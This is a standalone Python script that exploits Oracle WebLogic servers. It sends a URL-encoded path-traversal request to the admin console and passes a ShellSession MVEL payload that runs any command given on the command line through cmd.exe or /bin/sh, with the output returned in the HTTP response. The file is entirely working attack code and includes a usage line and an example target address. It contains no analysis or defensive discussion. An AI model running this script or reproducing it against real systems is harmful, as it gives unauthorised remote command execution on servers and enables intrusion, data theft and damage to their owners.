#!/usr/bin/env python3

import requests
import sys
from urllib.parse import quote
from urllib3.exceptions import InsecureRequestWarning

def exploit_weblogic(target_url, command):
    # Disable warnings for insecure HTTPS requests
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    # Correctly encode the URL path to prevent automatic decoding
    encoded_path = quote("/console/css/%2e%2e%2fconsole.portal", safe='')
    full_url = f"{target_url}{encoded_path}"

    print(f"Target URL: {full_url}")

    # Headers for the exploit request
    headers = {
        'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1',
        'Accept-Language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'Close',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
        'Pragma': 'no-cache',
        'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*',
    }

    # Adjust the payload with the correct command execution
    payload = '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(' \
              '"weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();' \
              'weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();' \
              'java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\\"connectionHandler\\");' \
              'field.setAccessible(true);' \
              'Object obj = field.get(adapter);' \
              'weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) ' \
              'obj.getClass().getMethod(\\"getServletRequest\\").invoke(obj);' \
              f'String[] cmds = System.getProperty(\\"os.name\\").toLowerCase().contains(\\"windows\\") ? ' \
              f'new String[]{{\\"cmd.exe\\", \\"/c\\", \\"{command}\\"}} : new String[]{{\\"/bin/sh\\", \\"-c\\", \\"{command}\\"}};' \
              'String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next();' \
              'weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) ' \
              'req.getClass().getMethod(\\"getResponse\\").invoke(req);' \
              'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));' \
              'res.getServletOutputStream().flush();' \
              'res.getWriter().write(\\"\\");' \
              'executeThread.interrupt();")'

    # Print payload for debugging
    print("Payload being sent:\n", payload[:500], "...[truncated]...")  # Truncate to avoid clutter

    # Make the exploit request
    response = requests.post(full_url, data=payload, headers=headers, verify=False)

    # Check the response
    if response.status_code == 200:
        print("Exploit sent successfully. Check the target for command output.")
    else:
        print(f"Failed to send exploit. HTTP Response Code: {response.status_code}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target-url> <command>")
        sys.exit("Example: python3 exploit.py http://192.168.1.100:7001 \"id\"")

    target = sys.argv[1]
    cmd = sys.argv[2]
    exploit_weblogic(target, cmd)
